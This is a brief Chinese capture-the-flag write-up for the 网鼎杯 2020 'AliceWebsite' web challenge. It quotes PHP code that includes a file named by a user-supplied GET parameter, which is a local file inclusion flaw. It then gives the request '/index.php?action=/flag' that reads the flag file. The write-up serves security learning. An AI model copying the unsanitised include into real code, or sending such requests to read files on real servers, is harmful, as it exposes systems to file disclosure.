# [网鼎杯 2020 半决赛]AliceWebsite
![](<./img/Pasted image 20230128143611.png>)

![](<./img/Pasted image 20230128144500.png>)

```php
<?php
$action = (isset($_GET['action']) ? $_GET['action'] : 'home.php');
if (file_exists($action)) {
	include $action;
} else {
	echo "File not found!";
}
?>
```

`index.php`中存在文件包含漏洞

```
/index.php?action=/flag
```

![](<./img/Pasted image 20230128144442.png>)

#Web #PHP #文件包含 